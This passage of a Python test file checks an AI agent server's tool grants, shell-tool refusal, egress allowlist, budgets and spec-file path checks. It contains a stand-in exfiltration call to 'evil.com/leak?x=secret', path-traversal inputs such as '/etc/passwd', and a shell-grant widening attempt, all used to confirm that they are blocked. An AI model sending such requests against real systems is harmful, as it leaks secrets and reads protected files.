        monkeypatch.setattr(agent_v1, "_build_provider", _raise)

        resp = c.post("/v1/agent/run", json={
            "task": "ping", "provider": "fakeprov", "model": "fakemodel",
        })
        assert resp.status_code == 400
        assert reg.list_runs() == []  # no orphan run

    def test_run_closed_book_is_oneshot_kind_no_egress_no_budget(
        self, client, monkeypatch
    ):
        # U3 (ADR 0011): every /v1/agent/run launch is kind=oneshot. With
        # execution.run.web_search OFF (the pinned default) the run is
        # closed-book: no egress baseline, no tool budget.
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        monkeypatch.setattr(
            agent_v1, "_build_provider", lambda name: self._fake_provider()
        )
        resp = c.post("/v1/agent/run", json={
            "task": "ping", "provider": "fakeprov", "model": "fakemodel",
        })
        one = self._poll_terminal(c, resp.json()["run_id"])
        assert one["kind"] == "oneshot"
        assert one["network"] == []
        assert one["budget"] == {}

    def test_run_web_search_on_grants_exactly_web_search(
        self, client, monkeypatch
    ):
        # U3 grant clamp: config ON routes the launch through the task-tier
        # runner with the hardwired {web_search} grant, the backend egress
        # baseline, and the small oneshot budget — and the REQUEST cannot
        # widen it (its tools field is ignored for execution).
        c, reg = client
        from ppxai.config import execution as exec_mod
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner

        monkeypatch.setattr(
            exec_mod, "get_execution_run_config",
            lambda: {"web_search": True, "grounding": False},
        )
        monkeypatch.setattr(
            agent_v1, "_build_provider", lambda name: self._fake_provider()
        )
        captured = {}

        def _stub_runner(registry, **kw):
            captured.update(kw)

            async def _r(m):
                return "grounded answer"
            return _r

        monkeypatch.setattr(task_runner, "build_task_runner", _stub_runner)

        resp = c.post("/v1/agent/run", json={
            "task": "what happened today", "provider": "fakeprov",
            "model": "fakemodel",
            "tools": ["execute_shell_command", "read_file"],  # widening attempt
        })
        assert resp.status_code == 200
        one = self._poll_terminal(c, resp.json()["run_id"])
        assert one["kind"] == "oneshot"
        assert one["tools"] == ["web_search"]
        assert captured["tools"] == ["web_search"]
        assert captured["allow_spawn"] is False
        assert one["budget"] == {"iterations": agent_v1.ONESHOT_SEARCH_ITERATIONS}
        assert one["network"] != []  # backend egress baseline rides along
        assert one["status"] == "completed_pending_ack"  # held (T6)
        assert one["result"] == "grounded answer"

    def test_events_endpoint_replay_and_filters(self, client):
        # Inc 3: GET .../events (non-live JSON) replays persisted events,
        # honoring ?since= / ?min_level= / ?category=.
        c, reg = client
        m = reg.start_run("t", provider="p", model="m")
        reg.emit_event(m.run_id, "dbg", level="debug", category="tool")
        reg.emit_event(m.run_id, "err", level="error", category="lifecycle")

        rid = m.run_id
        allev = c.get(f"/v1/agent/runs/{rid}/events").json()["events"]
        assert [e["type"] for e in allev] == ["dbg", "err"]
        # filters
        warn = c.get(f"/v1/agent/runs/{rid}/events?min_level=warning").json()["events"]
        assert [e["type"] for e in warn] == ["err"]
        tool = c.get(f"/v1/agent/runs/{rid}/events?category=tool").json()["events"]
        assert [e["type"] for e in tool] == ["dbg"]
        since = c.get(f"/v1/agent/runs/{rid}/events?since=1").json()["events"]
        assert [e["seq"] for e in since] == [2]
        # each record carries the two filter axes
        assert allev[0]["level"] == "debug" and allev[0]["category"] == "tool"

    def test_events_unknown_run_404(self, client):
        c, _ = client
        assert c.get("/v1/agent/runs/run_nope/events").status_code == 404

    def test_task_requires_nonempty_grant(self, client):
        # /v1/agent/task is the tool-capable tier: the grant is required +
        # non-empty (pydantic min_length=1 -> 422), so it can never run
        # tool-free by accident.
        c, _ = client
        assert c.post("/v1/agent/task", json={
            "task": "t", "tools": [], "provider": "p", "model": "m",
        }).status_code == 422
        assert c.post("/v1/agent/task", json={
            "task": "t", "provider": "p", "model": "m",
        }).status_code == 422

    def test_task_rejects_shell_grant(self, client):
        # AC-2 (security review High): a shell tool escapes the egress
        # allowlist (arbitrary curl/pip/etc.), so a /task grant containing it
        # is rejected up front with a clear 400 — not silently never run.
        c, _ = client
        r = c.post("/v1/agent/task", json={
            "task": "t", "tools": ["read_file", "execute_shell_command"],
            "provider": "p", "model": "m",
        })
        assert r.status_code == 400
        assert "execute_shell_command" in r.json()["detail"]

    def test_task_accepts_any_buildable_provider(self, client, monkeypatch):
        # v1.19.x: /task drives engine.chat() (abstract on BaseProvider — every
        # provider has it), so the tier no longer rejects native
        # openai/gemini/perplexity by class. A buildable provider is accepted;
        # the run is minted and backgrounded (it then fails only because the
        # stub engine isn't real — but the POST must NOT 400 on provider class).
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner

        class _AnyProvider:  # NOT an OpenAICompatibleProvider — must still pass
            pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _AnyProvider())
        # Isolate the CLASS-acceptance decision from ambient config: the route
        # fail-fasts via `_validate_provider_or_400` (unknown-provider / no-key
        # → 400) BEFORE building. That check reads the host's configured
        # providers + keys, so leaving it live makes the test non-hermetic — it
        # passed on a dev box with `openai` configured but 400'd in CI's clean
        # env (no openai provider/key). Stub it: this test is about provider
        # CLASS, not config validation (covered separately).
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)

        # Make the background runner a no-op so we isolate the route's accept
        # decision (no real EngineClient needed).
        async def _ok_runner(m):
            return "ok"
        monkeypatch.setattr(
            task_runner, "build_task_runner", lambda reg_, **kw: _ok_runner,
        )

        r = c.post("/v1/agent/task", json={
            "task": "t", "tools": ["read_file"], "provider": "openai", "model": "m",
        })
        assert r.status_code == 200          # accepted, not 400-by-class
        assert r.json()["status"] in ("running", "completed", "completed_pending_ack")
        assert len(reg.list_runs()) == 1     # run was minted

    def test_task_enforces_grant_end_to_end(self, client, monkeypatch):
        # Full /task path with EngineClient stubbed: the stubbed chat() calls
        # the (route-installed) ScopedToolManager.execute_tool on an off-grant
        # tool. AC-1: it's denied, base never runs it, a tool_denied event
        # lands on the run stream, and the run still completes.
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        from ppxai.engine.types import Event, EventType

        # Bypass provider build (it's OpenAI-compat-checked before backgrounding).
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())
        # /task fail-fast-validates the provider (no build) before minting the
        # run; the fake provider name here isn't configured, so stub it out too.
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)

        # Stub EngineClient: enable_tools no-op; chat() drives one off-grant
        # execute_tool through whatever tool_manager the route installed, then
        # ends. tool_manager is set to a real base so Scoped wraps something.
        from ppxai.engine.agent_scoped_tools import ScopedToolManager

        class _BaseTM:
            def __init__(self): self.ran = []
            async def execute_tool(self, name, **kw): self.ran.append(name); return "ran"
            max_iterations = 3

        class _StubEngine:
            def __init__(self): self.tool_manager = _BaseTM()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def set_working_dir(self, d): pass  # v1.19.x: unsealed runs set the default wd
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                # the route wrapped self.tool_manager in ScopedToolManager;
                # call a granted tool (emits tool_call with the real
                # data={"tool": ...} shape), attempt an off-grant tool
                # (denied), then finish with STREAM_END as a plain string.
                yield Event(type=EventType.TOOL_CALL, data={"tool": "read_file"})
                await self.tool_manager.execute_tool("write_file", path="x")
                yield Event(type=EventType.STREAM_END, data="done")

        stub = _StubEngine()
        monkeypatch.setattr(task_runner, "EngineClient", lambda: stub, raising=False)
        # the route imports EngineClient inside _runner; patch the source module
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)
        # v1.19.0: agent_v1 imports EngineClient at module top now (no lazy
        # import inside _runner), so patch the binding the runner actually
        # uses — the source-module patch above no longer reaches it.
        import ppxai.server.routes.agent_v1 as _agent_v1_mod
        monkeypatch.setattr(task_runner, "EngineClient", lambda: stub, raising=False)

        resp = c.post("/v1/agent/task", json={
            "task": "do it", "tools": ["read_file"],  # write_file NOT granted
            "provider": "p", "model": "m",
        })
        assert resp.status_code == 200
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        # T6: a successful top-level /task run HOLDS its result until /ack.
        assert one["status"] == "completed_pending_ack"
        assert one["result"] == "done"
        # AC-1: the off-grant tool was denied — base never ran it
        assert isinstance(stub.tool_manager, ScopedToolManager)
        assert stub.tool_manager._base.ran == []  # write_file never executed
        # tool events on the stream: a labeled tool_call (name captured from
        # event.data["tool"], not empty) AND the tool_denied.
        evs = c.get(f"/v1/agent/runs/{rid}/events?category=tool").json()["events"]
        assert any(e["type"] == "tool_denied" for e in evs)
        call = next((e for e in evs if e["type"] == "tool_call"), None)
        assert call is not None and call["data"]["tool"] == "read_file"  # name not empty

    def test_task_enforces_egress_end_to_end(self, client, monkeypatch):
        # AC-2: full /task path with a network spec. The stubbed chat() drives
        # a granted network tool (fetch_url) at an OFF-allowlist host through
        # the route-installed ScopedToolManager. The egress check denies it,
        # the base never runs it, a network_policy_denied event lands on the
        # 'network' channel, and the run still completes. Then a granted host
        # is allowed and emits network_policy_allowed.
        c, _reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        from ppxai.engine.types import Event, EventType
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider
        from ppxai.engine.agent_scoped_tools import ScopedToolManager

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())
        # /task fail-fast-validates the provider (no build) before minting the
        # run; the fake provider name here isn't configured, so stub it out too.
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)

        class _BaseTM:
            max_iterations = 3
            def __init__(self): self.ran = []
            async def execute_tool(self, name, **kw):
                self.ran.append((name, kw)); return "fetched"

        class _StubEngine:
            def __init__(self): self.tool_manager = _BaseTM()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def set_working_dir(self, d): pass  # v1.19.x: unsealed runs set the default wd
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                # one denied (evil.com), one allowed (api.github.com)
                await self.tool_manager.execute_tool(
                    "fetch_url", url="https://evil.com/leak?x=secret")
                await self.tool_manager.execute_tool(
                    "fetch_url", url="https://api.github.com/repos/x")
                yield Event(type=EventType.STREAM_END, data="done")

        stub = _StubEngine()
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)
        # v1.19.0: agent_v1 imports EngineClient at module top now (no lazy
        # import inside _runner), so patch the binding the runner actually
        # uses — the source-module patch above no longer reaches it.
        import ppxai.server.routes.agent_v1 as _agent_v1_mod
        monkeypatch.setattr(task_runner, "EngineClient", lambda: stub, raising=False)

        resp = c.post("/v1/agent/task", json={
            "task": "research", "tools": ["fetch_url"],
            "provider": "p", "model": "m",
            "network": {"allow_outbound": ["api.github.com"]},
        })
        assert resp.status_code == 200
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "completed_pending_ack"  # T6: held until /ack
        # the allowlist persisted on the run meta (provenance/audit)
        assert one["network"] == ["api.github.com"]
        # AC-2: evil.com NEVER fetched; only the allowed host ran
        assert isinstance(stub.tool_manager, ScopedToolManager)
        assert stub.tool_manager._base.ran == [
            ("fetch_url", {"url": "https://api.github.com/repos/x"})
        ]
        # both decisions on the 'network' channel
        evs = c.get(f"/v1/agent/runs/{rid}/events?category=network").json()["events"]
        denied = next((e for e in evs if e["type"] == "network_policy_denied"), None)
        allowed = next((e for e in evs if e["type"] == "network_policy_allowed"), None)
        assert denied is not None and denied["data"]["target_host"] == "evil.com"
        assert denied["data"]["allowlist_rule_id"] is None
        assert allowed is not None and allowed["data"]["target_host"] == "api.github.com"
        assert allowed["data"]["run_id"] == rid

    def test_task_provider_error_fails_run(self, client, monkeypatch):
        # codex MEDIUM: the engine reports provider/config failures as
        # EVENTS (EventType.ERROR / PROVIDER_THROTTLED), not exceptions —
        # chat() yields one and returns normally. The runner must turn that
        # into a FAILED run, not a clean completed-empty run (which would
        # silently mask provider outages as successful empty answers).
        c, _reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        from ppxai.engine.types import Event, EventType
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())
        # /task fail-fast-validates the provider (no build) before minting the
        # run; the fake provider name here isn't configured, so stub it out too.
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)

        class _BaseTM:
            max_iterations = 3
            async def execute_tool(self, name, **kw): return "ran"

        class _StubEngine:
            def __init__(self): self.tool_manager = _BaseTM()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def set_working_dir(self, d): pass  # v1.19.x: unsealed runs set the default wd
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                # provider blew up mid-call — engine surfaces it as an event
                yield Event(
                    type=EventType.ERROR,
                    data={"message": "upstream 500 from provider"},
                )

        stub = _StubEngine()
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)
        # v1.19.0: agent_v1 imports EngineClient at module top now (no lazy
        # import inside _runner), so patch the binding the runner actually
        # uses — the source-module patch above no longer reaches it.
        import ppxai.server.routes.agent_v1 as _agent_v1_mod
        monkeypatch.setattr(task_runner, "EngineClient", lambda: stub, raising=False)

        resp = c.post("/v1/agent/task", json={
            "task": "do it", "tools": ["read_file"],
            "provider": "p", "model": "m",
        })
        assert resp.status_code == 200
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "failed"  # NOT completed
        assert "upstream 500 from provider" in (one["error"] or "")
        # and the failure is on the event stream as an error-level event
        evs = c.get(f"/v1/agent/runs/{rid}/events").json()["events"]
        assert any(e["type"] == "agent_run_error" for e in evs)

    def _budget_stub_engine(self, n_tool_calls):
        """An engine stub whose chat() emits n TOOL_CALL events then ends."""
        from ppxai.engine.types import Event, EventType

        class _BaseTM:
            max_iterations = 99
            async def execute_tool(self, name, **kw): return "ran"

        class _StubEngine:
            def __init__(self): self.tool_manager = _BaseTM()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def set_working_dir(self, d): pass  # v1.19.x: unsealed runs set the default wd
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                for _ in range(n_tool_calls):
                    yield Event(type=EventType.TOOL_CALL, data={"tool": "read_file"})
                yield Event(type=EventType.STREAM_END, data="done")

        return _StubEngine()

    def test_task_iteration_budget_interrupts(self, client, monkeypatch):
        # Inc 6: a run that exceeds its iteration budget stops at a clean
        # checkpoint with status=interrupted + resumable=True (NOT failed).
        c, _reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())
        # /task fail-fast-validates the provider (no build) before minting the
        # run; the fake provider name here isn't configured, so stub it out too.
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)

        stub = self._budget_stub_engine(n_tool_calls=5)  # would do 5 iterations
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)
        # v1.19.0: agent_v1 imports EngineClient at module top now (no lazy
        # import inside _runner), so patch the binding the runner actually
        # uses — the source-module patch above no longer reaches it.
        import ppxai.server.routes.agent_v1 as _agent_v1_mod
        monkeypatch.setattr(task_runner, "EngineClient", lambda: stub, raising=False)

        resp = c.post("/v1/agent/task", json={
            "task": "loop", "tools": ["read_file"],
            "provider": "p", "model": "m",
            "budget": {"iterations": 2},  # cap below the 5 the stub would do
        })
        assert resp.status_code == 200
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "interrupted"   # not failed, not completed
        assert one["resumable"] is True
        assert one["budget"] == {"iterations": 2}  # persisted
        # only the budgeted number of tool_calls were surfaced before the stop
        tool_evs = c.get(f"/v1/agent/runs/{rid}/events?category=tool").json()["events"]
        assert len([e for e in tool_evs if e["type"] == "tool_call"]) == 2
        # the interrupt is on the lifecycle stream
        life = c.get(f"/v1/agent/runs/{rid}/events?category=lifecycle").json()["events"]
        assert any(e["type"] == "agent_run_interrupted" for e in life)

    def test_no_budget_runs_to_completion(self, client, monkeypatch):
        # control: same stub, no budget -> all iterations run, completes.
        c, _reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())
        # /task fail-fast-validates the provider (no build) before minting the
        # run; the fake provider name here isn't configured, so stub it out too.
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)
        stub = self._budget_stub_engine(n_tool_calls=3)
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)
        # v1.19.0: agent_v1 imports EngineClient at module top now (no lazy
        # import inside _runner), so patch the binding the runner actually
        # uses — the source-module patch above no longer reaches it.
        import ppxai.server.routes.agent_v1 as _agent_v1_mod
        monkeypatch.setattr(task_runner, "EngineClient", lambda: stub, raising=False)

        resp = c.post("/v1/agent/task", json={
            "task": "loop", "tools": ["read_file"], "provider": "p", "model": "m",
        })
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "completed_pending_ack"  # T6: held until /ack
        assert one["resumable"] is False

    def test_task_token_budget_interrupts(self, client, monkeypatch):
        # Inc 6 (codex MEDIUM fix): the token budget must be ENFORCED from the
        # run's real usage, not just exposed. This stub grows
        # session.live_run_tokens by 40 per tool call — mirroring what the real
        # chat_with_tools does (it bumps live_run_tokens in lockstep with its
        # accumulated_usage at each provider STREAM_END; session.usage itself is
        # only committed at the terminal STREAM_END, so it's stale mid-run, which
        # is exactly why the budget check reads live_run_tokens, v1.19.0). With a
        # 100-token budget the run must interrupt once the cumulative total hits
        # the cap (after iter 3: 0,40,80 ok -> 120 >= 100 stops).
        c, _reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        from ppxai.engine.types import Event, EventType
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())
        # /task fail-fast-validates the provider (no build) before minting the
        # run; the fake provider name here isn't configured, so stub it out too.
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)

        class _Usage:
            def __init__(self): self.total_tokens = 0
        class _Session:
            def __init__(self):
                self.usage = _Usage()
                # The live in-flight mirror the budget check actually reads;
                # real chat_with_tools resets this at run start + bumps it
                # per provider STREAM_END.
                self.live_run_tokens = 0
        class _BaseTM:
            max_iterations = 99
            async def execute_tool(self, name, **kw): return "ran"

        class _TokenStub:
            def __init__(self):
                self.tool_manager = _BaseTM()
                self.session = _Session()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def set_working_dir(self, d): pass  # v1.19.x: unsealed runs set the default wd
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                for _ in range(10):
                    # tokens accrue BEFORE the boundary check reads them —
                    # exactly as the real engine bumps live_run_tokens.
                    self.session.live_run_tokens += 40
                    yield Event(type=EventType.TOOL_CALL, data={"tool": "read_file"})
                yield Event(type=EventType.STREAM_END, data="done")

        stub = _TokenStub()
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)
        # v1.19.0: agent_v1 imports EngineClient at module top now (no lazy
        # import inside _runner), so patch the binding the runner actually
        # uses — the source-module patch above no longer reaches it.
        import ppxai.server.routes.agent_v1 as _agent_v1_mod
        monkeypatch.setattr(task_runner, "EngineClient", lambda: stub, raising=False)

        resp = c.post("/v1/agent/task", json={
            "task": "burn tokens", "tools": ["read_file"],
            "provider": "p", "model": "m",
            "budget": {"tokens": 100},
        })
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "interrupted"   # token cap actually stopped it
        assert one["resumable"] is True
        assert one["budget"] == {"tokens": 100}
        # stopped well before the stub's 10 iterations
        tool_evs = c.get(f"/v1/agent/runs/{rid}/events?category=tool").json()["events"]
        assert 0 < len([e for e in tool_evs if e["type"] == "tool_call"]) < 10

    def test_cancel_unknown_run_404(self, client):
        c, _ = client
        assert c.post("/v1/agent/runs/run_nope/cancel").status_code == 404

    def test_cancel_terminal_run_409(self, client):
        # a finished run can't be cancelled
        c, reg = client
        m = reg.start_run(task="t", tools=["read_file"], provider="p", model="m")
        reg.finish_run(m, status="completed", result="x")
        r = c.post(f"/v1/agent/runs/{m.run_id}/cancel")
        assert r.status_code == 409
        assert "not cancellable" in r.json()["detail"]

    @pytest.mark.asyncio
    async def test_events_live_sse_path(self, client):
        # Inc 3 LOW (codex): exercise the actual ?live=1 SSE generator
        # end-to-end — backlog replay, live event via the queue,
        # overflow self-heal from disk, keepalive, and disconnect cleanup.
        #
        # We drive the route's StreamingResponse body iterator directly
        # rather than via TestClient: the SSE generator is intentionally
        # infinite (keepalive loop), which makes TestClient's stream
        # teardown block. Driving the iterator lets us assert the real
        # logic AND control disconnect deterministically.
        import asyncio
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner

        c, reg = client
        m = reg.start_run("t", provider="p", model="m")
        reg.emit_event(m.run_id, "backlog1", level="info", category="lifecycle")

        # Controllable disconnect: request.is_disconnected() flips when we say.
        disconnected = {"v": False}

        class _Req:
            async def is_disconnected(self):
                return disconnected["v"]

        resp = await agent_v1.get_agent_run_events(
            run_id=m.run_id, request=_Req(), since=0, live=True,
            min_level="debug", category=None,
        )
        body = resp.body_iterator
        frames = []

        async def _next_data(timeout=2.0):
            # pull frames until the next data: line (skip keepalives)
            while True:
                chunk = await asyncio.wait_for(body.__anext__(), timeout)
                if chunk.startswith("data: "):
                    return json.loads(chunk[6:])

        # 1. backlog replays as an SSE data frame
        frames.append(await _next_data())
        # 2. a live event arrives via the queue
        reg.emit_event(m.run_id, "live1", level="warning", category="network")
        frames.append(await _next_data())
        # 3. overflow self-heal: fill the queue so emit flags it, then the
        #    generator should replay the missed events from disk.
        q = next(iter(reg._subscribers[m.run_id]))
        for i in range(q.maxsize + 3):
            reg.emit_event(m.run_id, f"flood{i}", level="info", category="tool")
        healed = await _next_data(timeout=3.0)
        frames.append(healed)

        types = [f["type"] for f in frames]
        assert types[0] == "backlog1"          # backlog replayed
        assert types[1] == "live1"             # live via queue
        assert types[2].startswith("flood")    # self-healed from disk after overflow
        seqs = [f["seq"] for f in frames]
        assert seqs == sorted(seqs) and len(set(seqs)) == len(seqs)  # ordered, no dup

        # 4. keepalive: with nothing emitted and not disconnected, the gen
        #    yields a comment frame on timeout (we don't wait the full 15s;
        #    just assert disconnect cleanly ends the generator).
        disconnected["v"] = True
        with pytest.raises(StopAsyncIteration):
            # drain any buffered frames, then the loop sees disconnect → ends
            for _ in range(q.maxsize + 10):
                await asyncio.wait_for(body.__anext__(), 2.0)
        # generator exhausted → its finally ran → subscriber removed
        assert m.run_id not in reg._subscribers or q not in reg._subscribers.get(m.run_id, set())


class TestTaskSpecFiles:
    """T3: `/task` spec-file resolution, precedence, and the ceiling clamp.

    Security-critical paths (path-escape, shell-in-spec, empty grant) reject
    BEFORE provider construction, so they need no provider mock. The two
    happy-path tests stub the provider to prove precedence end-to-end.
    """

    @staticmethod
    def _fake_provider():
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _FakeProvider(OpenAICompatibleProvider):
            def __init__(self):
                pass

            def oneshot(self, *, prompt, model, system=None, **kw):
                return {"content": f"echo: {prompt}", "finish_reason": "stop"}

        return _FakeProvider()

    _TERMINAL = ("completed", "completed_pending_ack", "finalized",
                 "failed", "cancelled", "interrupted")

    @classmethod
    def _poll_terminal(cls, c, run_id, timeout_s=5.0):
        import time as _t

        deadline = _t.monotonic() + timeout_s
        one = None
        while _t.monotonic() < deadline:
            one = c.get(f"/v1/agent/runs/{run_id}").json()
            if one["status"] in cls._TERMINAL:
                return one
            _t.sleep(0.02)
        raise AssertionError(f"run {run_id} did not finish: last={one}")

    def _cfg(self, tmp_path, **extra):
        specs = tmp_path / "specs"
        specs.mkdir(exist_ok=True)
        cfg = {
            "enabled": True,
            "sandbox": {"specs_dir": str(specs)},
        }
        cfg.update(extra)
        return cfg, specs

    def _patch_cfg(self, monkeypatch, cfg):
        """Patch the execution.task.* accessor (ADR 0010 shape).

        `cfg` uses the NEW nested shape: {"enabled": ..., "sandbox": {...}}.
        default_subagent is a separate accessor and patched on its own.

        The double is completed with the accessor's own consent/budgets
        defaults: the real `get_execution_task_config()` ALWAYS returns those
        sub-blocks, and the route subscripts them strictly on purpose (a
        missing sub-block is an accessor regression that should fail loudly,
        not silently default). A partial double must not weaken that."""
        from ppxai.config.execution import get_execution_task_config as _real
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        full = {**_real(), **cfg}
        monkeypatch.setattr(agent_v1, "get_execution_task_config", lambda: full)
        # Both modules hold their own binding after the v1.19.1 split:
        # the ROUTE validates skills/spec config, the RUNNER reads the
        # sandbox block. Patching one leaves the other on real config.
        monkeypatch.setattr(task_runner, "get_execution_task_config", lambda: full)
        monkeypatch.setattr(agent_v1, "get_execution_default_subagent", lambda: {})

    # --- rejection paths (no provider needed) --------------------------------

    def test_spec_given_but_specs_dir_not_configured_400(self, client, monkeypatch):
        c, _ = client
        self._patch_cfg(monkeypatch, {"enabled": True, "sandbox": {}})
        r = c.post("/v1/agent/task", json={"task": "t", "spec": "triage"})
        assert r.status_code == 400 and "specs_dir" in r.json()["detail"]

    def test_spec_name_path_escape_rejected(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, _ = self._cfg(tmp_path)
        self._patch_cfg(monkeypatch, cfg)
        for bad in ("../secret", "a/b", "/etc/passwd", "..\\x", ".."):
            r = c.post("/v1/agent/task", json={"task": "t", "spec": bad})
            assert r.status_code == 400, f"{bad!r} not rejected"

    def test_spec_not_found_400(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, _ = self._cfg(tmp_path)
        self._patch_cfg(monkeypatch, cfg)
        r = c.post("/v1/agent/task", json={"task": "t", "spec": "nope"})
        assert r.status_code == 400 and "not found" in r.json()["detail"]

    def test_shell_in_spec_rejected_ceiling_clamp(self, client, monkeypatch, tmp_path):
        # The clamp: a spec-supplied shell grant is rejected the same as a
        # request-supplied one — the guards run on the MERGED grant.
        c, _ = client
        cfg, specs = self._cfg(tmp_path)
        (specs / "danger.md").write_text(
            "---\ntools: [execute_shell_command]\n---\nx\n", encoding="utf-8")
        self._patch_cfg(monkeypatch, cfg)
        r = c.post("/v1/agent/task", json={
            "task": "t", "spec": "danger", "provider": "p", "model": "m"})
        assert r.status_code == 400 and "shell" in r.json()["detail"].lower()

    def test_spec_yields_empty_grant_400_not_422(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, specs = self._cfg(tmp_path)
        (specs / "notools.md").write_text("---\nprovider: p\n---\nx\n", encoding="utf-8")
        self._patch_cfg(monkeypatch, cfg)
        r = c.post("/v1/agent/task", json={"task": "t", "spec": "notools"})
        assert r.status_code == 400 and "grant" in r.json()["detail"].lower()

    def test_no_spec_no_tools_still_422(self, client):
        # Preserved invariant: without a spec, empty/missing grant is 422.
        c, _ = client
        assert c.post("/v1/agent/task", json={"task": "t"}).status_code == 422
        assert c.post("/v1/agent/task", json={"task": "t", "tools": []}).status_code == 422

    # --- merge/precedence: assert on the MINTED run meta ---------------------
    # T3 governs what the run is MINTED with (the merge), not whether the chat
    # loop executes. tools/provider/model are recorded at start_run, so read the
    # meta right after the 200 — no need to drive the (provider-dependent) run to
    # completion. `_validate_provider_or_400` is stubbed so the mint proceeds;
    # the background run may fail harmlessly (fake provider can't drive chat).

    def _mint(self, c, monkeypatch, body):
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)
        r = c.post("/v1/agent/task", json=body)
        assert r.status_code == 200, r.text
        return c.get(f"/v1/agent/runs/{r.json()['run_id']}").json()

    def test_spec_supplies_grant_provider_model(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, specs = self._cfg(tmp_path)
        (specs / "triage.md").write_text(
            "---\ntools: [read_file, grep]\nprovider: specprov\nmodel: specmodel\n"
            "budget: {iterations: 3}\nnetwork: [ci.example.com]\n---\nbe terse\n",
            encoding="utf-8")
        self._patch_cfg(monkeypatch, cfg)
        one = self._mint(c, monkeypatch, {"task": "the CI job is red", "spec": "triage"})
        assert one["tools"] == ["read_file", "grep"]
        assert one["provider"] == "specprov" and one["model"] == "specmodel"
        assert one["budget"] == {"iterations": 3}
        assert one["network"] == ["ci.example.com"]

    def test_request_field_overrides_spec(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, specs = self._cfg(tmp_path)
        (specs / "triage.md").write_text(
            "---\ntools: [read_file]\nprovider: specprov\nmodel: specmodel\n---\nx\n",
            encoding="utf-8")
        self._patch_cfg(monkeypatch, cfg)
        one = self._mint(c, monkeypatch, {
            "task": "t", "spec": "triage",
            "model": "reqmodel", "tools": ["write_file"]})
        assert one["model"] == "reqmodel"        # request wins
        assert one["tools"] == ["write_file"]    # request grant wins wholesale
        assert one["provider"] == "specprov"     # spec fills the gap


class TestTaskSkills:
    """T4: `/task --skill` resolution, grant union, scripts refusal, mount.

    Mirrors TestTaskSpecFiles: rejection paths need no provider (they 400
    before construction); the mint paths stub `_validate_provider_or_400` and
    read the authoritative meta right after the 200.
    """

